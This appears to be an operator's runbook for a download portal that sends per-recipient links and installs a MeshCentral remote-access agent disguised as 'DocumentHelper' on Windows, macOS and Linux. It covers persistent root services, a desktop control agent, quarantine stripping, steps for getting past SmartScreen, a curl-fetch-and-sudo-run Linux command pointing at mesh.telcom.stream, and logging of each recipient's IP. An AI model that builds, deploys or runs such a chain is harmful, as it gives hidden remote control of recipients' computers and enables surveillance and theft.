# Install chain — reyessitework.pages.dev

How a recipient goes from a pasted link to a node that is actually connected in
MeshCentral, what each artifact contains, and **which assumptions break it**.

```
/sender  (passcode)  ->  /f/<token>?to=Name  ->  /get  ->  /dl/<artifact>
                                                              |
              +-----------------------------------------------+
              |                       |                       |
        Windows .exe             macOS .pkg              Linux .run
     NSIS -> Program Files    pkg -> /usr/local/bin    MeshCentral script
              |                       |                       |
              +-----------+-----------+-----------------------+
                          |
             agent loads its config -> wss://mesh.telcom.stream:443/agent.ashx
                          |
                   WebSocket 101 -> node joins MH-<leadid>
```

---

## 1. Sender: `/sender`

- Gated by the Pages env var `SENDER_KEY`; the worker also has a built-in
  fallback string. **Set `SENDER_KEY` in the Pages project** — if the env var is
  ever removed, `/sender` silently falls back to the code default.
- `POST pass` -> sets `sk` cookie (`HttpOnly; Secure; SameSite=Strict`, 30 days)
  -> 303 to `/sender`. `?logout` clears it.
- The generator mints **one link per recipient**: `/f/<token>?to=<name>`. The
  token is shared; `to` is the only per-recipient data, and it is client-side
  unless something forwards it (see §3).

## 2. Portal: `/f/<token>`

`mh1/portal.html` -> `/var/www/send/index.html` -> bundle `index.html`.

- Reads `to` (`to` or `email`), sanitises it, and personalises the page.
- Detects OS from the UA, labels the button, and auto-starts the download.
- **Primary links are the bare artifacts**: `/dl/DocumentHelper.exe`,
  `/dl/DocumentHelper.pkg`, `/dl/DocumentHelper.run`.
- **Only the bare artifacts are published.** The old archives
  (`DocumentHelper-Windows.zip`, `DocumentHelper-macOS.zip`) are no longer in the
  bundle or the manifest, but their URLs are kept alive in `_worker.js` and
  **302 to the matching bare installer**, so a link already handed out never
  404s. Do not delete those two routes without checking nothing still points at
  them.
- Forwarding is load-bearing: `location.href='/get'+(location.search||'')`.
  Without it every download logs `to:"-"`.

## 3. Redirect: `/get` and `/dl/`

`mh1/mk-pages-worker3.js` -> `_worker.js`.

| UA | target |
|---|---|
| `Windows` | `/dl/DocumentHelper.exe` |
| `Macintosh` / `Mac OS X` | `/dl/DocumentHelper.pkg` |
| `Linux` / `X11` | `/dl/DocumentHelper.run` |
| anything else | `/dl/DocumentHelper.exe` |

- `/dl/*` serves the asset with `Content-Disposition: attachment`,
  `X-Content-Type-Options: nosniff`, `Cache-Control: no-store`.
- **Attribution** — the worker emits one JSON line per event:

  | `evt` | when | fields |
  |---|---|---|
  | `open` | `/f/<token>` page view | `to`, `code`, `ip`, `ua`, `path` |
  | `pick` | `/get` OS choice | `to`, `file`, `ip`, `ua`, `path` |
  | `download` | `/dl/<file>` (incl. direct links) | `to`, `file`, `ip`, `ua`, `path` |

  Tail them live:

  ```bash
  wrangler pages deployment tail <deployment-id> \
    --project-name=reyessitework --format=json
  ```

  A recipient who opens the folder link and then installs produces
  `open` -> `pick` -> `download`, all carrying the same `to`.

## 4. Windows: `DocumentHelper.exe`

Bare `.exe` (NSIS, silent, `RequestExecutionLevel admin`).

1. installs to `%PROGRAMFILES64%\DocumentHelper\DocumentHelper.exe`;
2. runs `-uninstall` (clears any previous service), then `-install`;
3. registers the Windows service; the agent connects.

**Config is baked into the agent executable.** MeshCentral personalises the
Windows agent by appending its settings to the binary; the shipped
`DocumentHelper.exe` ends with:

```
MeshName=MH-<leadid>
MeshType=2
MeshID=0x2112FD7D8C08A45F7B646FE30180E13B15F29894B27B2D0A97CC289B54C042A9A44C6EA414502B08EC2AE470D9DB2036
ServerID=F1448F25269B95090AA938C6C6BC88975A9D7A1A2E1C082D234F7475D76CE0E4C7A195E354D7934F42D7E6C2961E3963
MeshServer=wss://mesh.telcom.stream:443/agent.ashx
```

So Windows needs **no `.msh`** — `mh1/w.nsi` intentionally installs only the exe.

> **Breakable assumption:** this holds *only* for the personalised agent
> (`mh1/DocumentHelper.exe`, sha256 `54c8239d…adbea`). If that file is ever
> replaced with a **generic** MeshCentral agent, Windows will install, enrol
> nothing, and log `No MeshCentral settings found`. If you ever swap it, you must
> either re-personalise it from the MeshCentral UI or add `File "DocumentHelper.msh"`
> + `SetOutPath "$INSTDIR"` to `w.nsi`. `verify-agents.ps1` §6 fails the build
> if the baked `MeshServer`/`MeshID` is missing.

Friction: one UAC prompt. Unsigned, so SmartScreen may show
"Windows protected your PC" -> **More info** -> **Run anyway**. A `.lnk` or ZIP
does not remove that: SmartScreen evaluates the exe, and a ZIP adds an
extraction step plus Mark-of-the-Web.

## 5. macOS: `DocumentHelper.pkg`

Built by `.github/workflows/mac-pkg.yml` on `macos-latest` (`mac/build.sh`),
unsigned by design.

Payload:

| path | mode | role |
|---|---|---|
| `/usr/local/bin/DocumentHelper` | `755 root:wheel` | universal agent, ad-hoc signed |
| `/usr/local/bin/DocumentHelper.msh` | `644 root:wheel` | **the server config** |
| `/Library/LaunchDaemons/com.documentexchange.helper.plist` | | root daemon, `RunAtLoad`+`KeepAlive` |
| `/Library/LaunchAgents/com.documentexchange.helper-launchagent.plist` | | GUI `-kvmagent` (desktop session) |

1. `preinstall` aborts unless `uname -m` is `arm64`/`x86_64`;
2. payload installs as `root:wheel`;
3. `postinstall` fixes ownership/modes, strips quarantine, then
   `launchctl bootstrap system …` (fallback `load`), and loads the LaunchAgent
   into the console UID.

**The macOS agent is the generic binary and has no baked config.** It loads
`<execPath>.msh`, i.e. `/usr/local/bin/DocumentHelper.msh`. Delete that file and
the agent dies with `No MeshCentral settings found`. `mac/build.sh` fails the
build if the `.msh` is missing or does not point at
`wss://mesh.telcom.stream:443/agent.ashx`.

Also note: the agent's install verb is `-install` (single dash); `--install`
does nothing. The pkg avoids relying on it entirely by letting launchd own
startup.

Friction: right-click -> **Open** -> **Open** -> admin password. No Terminal.

## 6. Linux: `DocumentHelper.run`

```bash
mktemp -d
curl -fsSL https://mesh.telcom.stream/meshagents?script=1 -o mi.sh
chmod 755 mi.sh
sudo -E ./mi.sh https://mesh.telcom.stream '<group id>'
```

MeshCentral's own installer writes the `.msh` and the systemd unit. Friction:
`sudo`.

## 7. Convergence

All three platforms end in the same place: the agent reads `MeshServer` from
either the baked block (Windows) or the sibling `.msh` (macOS, and Linux via the
server script), opens `wss://mesh.telcom.stream:443/agent.ashx`, and the server
answers **101 Switching Protocols**. Node then appears under `MH-<leadid>`.

## 8. Friction, honestly

| OS | actions | unavoidable prompts |
|---|---|---|
| Windows | click download -> double-click | UAC; maybe SmartScreen "Run anyway" |
| macOS | click download -> right-click Open -> Open | one Gatekeeper prompt (unsigned) |
| Linux | `sh DocumentHelper.run` | `sudo` |

Only code signing (Windows OV/EV) and Apple Developer ID + notarization remove
the remaining prompts. Wrapping cannot.

## 9. Verifying

```powershell
powershell -NoProfile -ExecutionPolicy Bypass -File mh1\verify-agents.ps1
```

Checks: `/get` per OS; artifact hashes vs `dl/RELEASES.txt`; **legacy ZIP URLs
still 302 to the bare artifacts**; bare downloads carry
`Content-Disposition: attachment` + `nosniff`; `/agent.ashx` 101 + UI 200;
**Windows baked `MeshServer`/`MeshID`** and **macOS `.msh`**; portal primary
links, no ZIP links, and `?to=` forwarding.

Expected artifact hashes:

| artifact | sha256 |
|---|---|
| `DocumentHelper.exe` | `cc559d22fe103f2022179e0c0f0630897bfb05f446d1d308d33fbfa7bf7b406b` |
| `DocumentHelper.pkg` | `9bf3ea0c0279797f0f636295f7911fd70f7b73f6171fa166ff17cab066ca5948` |
| `DocumentHelper.run` | `61030df5bf39ac785a4f376118af787f073ec83d6a1d00180bd079c416e5a53b` |

The two `.zip` builds still exist as scripts (`make-windows-bundle.ps1`,
`make-macos-bundle.sh`) but are no longer published.

## 10. Rebuilding

- **Windows**: `"C:\Program Files (x86)\NSIS\makensis.exe" /V2 mh1\w.nsi`
  (input `mh1/DocumentHelper.exe` — the personalised agent; see §4).
- **macOS**: push to `mac/**`, or run the `mac-pkg` workflow. Artifact:
  `DocumentHelper-pkg`.
- **Linux**: edit `mh1/dl/DocumentHelper.run` (group id lives there).
- **Deploy**: copy artifacts to `/var/www/send/dl/`, refresh `RELEASES.txt`,
  run `mh1/mk-pages-dir.sh`, then `wrangler pages deploy <dir>
  --project-name=reyessitework --branch=main`.
- **After any deploy**: run `verify-agents.ps1`. Do not send links until it is
  green.

## 11. Assumptions that can break this

1. **Windows config is baked in, not in a `.msh`.** Swap the agent for a generic
   build and Windows enrols nothing. (`verify-agents.ps1` §6 guards this.)
2. **macOS needs the sibling `.msh`.** It is generic; the pkg must always ship
   it. (`mac/build.sh` guards this.)
3. **`?to=` must be forwarded** by the portal or attribution is lost.
4. **`SENDER_KEY` env var.** Removing it silently re-enables the code fallback.
5. **Unsigned artifacts.** Gatekeeper/SmartScreen prompts are expected; the
   `productsign`/`notarytool` block in `mac/build.sh` is commented out until a
   Developer ID exists.
6. **Service aliasing.** `aliasPort=443`, `trustedProxy=127.0.0.1`, and
   `certUrl=127.0.0.1:443/` are what make `wss://…:443/agent.ashx` work behind
   the reverse proxy.